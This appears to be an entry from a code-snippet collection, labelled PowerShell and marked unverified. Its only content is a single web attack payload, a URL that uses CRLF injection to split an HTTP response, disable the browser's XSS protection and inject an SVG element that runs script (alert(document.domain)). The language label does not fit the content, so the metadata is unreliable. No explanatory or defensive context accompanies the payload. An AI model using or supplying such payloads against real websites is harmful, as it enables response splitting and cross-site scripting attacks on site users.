---
id: d6de210d-d25a-4f6b-9227-1756313090a3
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:55:55.297403+00:00'
updated_at: '2023-04-06T03:55:55.304544+00:00'
---

# Code Snippet d6de210d

**Language**: Powershell

```powershell
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```


